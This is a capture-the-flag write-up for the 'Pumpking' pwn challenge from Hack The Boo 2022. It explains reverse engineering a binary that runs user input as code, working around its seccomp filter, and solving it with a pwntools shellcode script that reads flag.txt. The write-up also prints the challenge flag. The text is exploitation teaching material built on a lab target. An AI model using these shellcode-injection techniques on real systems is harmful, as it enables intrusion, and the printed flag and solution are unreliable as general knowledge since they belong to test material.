# Hack The Boo 2022

## Pumpking

> Long live the King! Pumpking is the king of our hometown and this time of the year, he makes wishes come true! But, you must be naughty in order to get a wish.. He is like reverse Santa Claus and way cooler!
>
>  Author: N/A
>
> [`pwn_pumpking.zip`](pwn_pumpking.zip)

Tags: _pwn_

## Preparation

Inspecting the executable in Ghidra reveals the logic in main. The first thing to note is a "secret" passphrase the program verifies. After entering ```pumpk1ngRulez``` a function ```king``` is called.

```c++
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  local_1f = 0;
  local_17 = 0;
  local_13 = 0;
  local_11 = 0;
  write(1,
        "\nFirst of all, in order to proceed, we need you to whisper the secret passphrase provided  only to naughty kids: "
        ,0x70);
  read(0,&local_1f,0xe);
  local_28 = 0;
  while( true ) {
    sVar2 = strlen((char *)&local_1f);
    if (sVar2 <= local_28) break;
    if (*(char *)((long)&local_1f + local_28) == '\n') {
      *(undefined *)((long)&local_1f + local_28) = 0;
    }
    local_28 = local_28 + 1;
  }
  iVar1 = strncmp((char *)&local_1f,"pumpk1ngRulez",0xd);
  if (iVar1 == 0) {
    king();
  }
  else {
    write(1,"\nYou seem too kind for the Pumpking to help you.. I\'m sorry!\n\n",0x3e);
  }
```

This looks fine. Some input is taken and written onto the stack. Afterwards the same location is called as function. With this lot of space it's easy to put some shellcode onto the stack and ```king``` happily executes it.

```c++
  write(1,
        "\n[Pumpkgin]: Welcome naughty kid! This time of the year, I will make your wish come true!  Wish for everything, even for tha flag!\n\n>> "
        ,0x88);
  local_a8 = 0;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_14 = 0;
  read(0,&local_a8,0x95);
  (*(code *)&local_a8)();
```

## Solution

The first idea is to look for some small shellcode to run /bin/sh and give a shell. There are lots of resources that offer pre-crafted shellcode like this. Putting this into action sadly lets the program crash. So for further inspection GDB can be attached and it can be verified that the shellcode is indeed executed

```
►  0x7fffc0f43580    xor    eax, eax
   0x7fffc0f43582    movabs rbx, 0xff978cd091969dd1
   0x7fffc0f4358c    neg    rbx
   0x7fffc0f4358f    push   rbx
   0x7fffc0f43590    push   rsp
   0x7fffc0f43591    pop    rdi
   0x7fffc0f43592    cdq    
   0x7fffc0f43593    push   rdx
   0x7fffc0f43594    push   rdi
   0x7fffc0f43595    push   rsp
   0x7fffc0f43596    pop    rsi
   ...
```

But the program still crashes with ```Program terminated with signal SIGSYS, Bad system call.```. Why is that? The reason lies in *SECCOMP* that prevents the shellcode to invoke syscalls. This means, going back to Ghidra, doing more investigation. And indeed there is some interesting code inside the function ```setup```.

```c++
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x7f);
  uVar2 = seccomp_init(0);
  seccomp_rule_add(uVar2,0x7fff0000,0x101,0);
  seccomp_rule_add(uVar2,0x7fff0000,0,0);
  seccomp_rule_add(uVar2,0x7fff0000,0x3c,0);
  seccomp_rule_add(uVar2,0x7fff0000,1,0);
  seccomp_rule_add(uVar2,0x7fff0000,0xf,0);
  seccomp_load(uVar2);
```

There are in fact some syscalls allowed. Looking up the syscall ids leads to three interesting calls: ```openat```, ```read``` and ```write```. Those calls can be used to craft our shellcode and as the location of *flag.txt* is known it is easy to create.

```python
payload = shellcraft.openat(-100, "flag.txt") # handler value -100 opens file relative to executable
payload += shellcraft.read('rax', 'rsp', 50)
payload += shellcraft.write(1, 'rsp', 50)
payload += shellcraft.exit(0)
p.sendlineafter(b">> ", asm(payload))
p.interactive()
```

Calling this reveals the flag ```HTB{n4ughty_b01z_d0_n0t_f0ll0w_s3cc0mp_rul3z}```
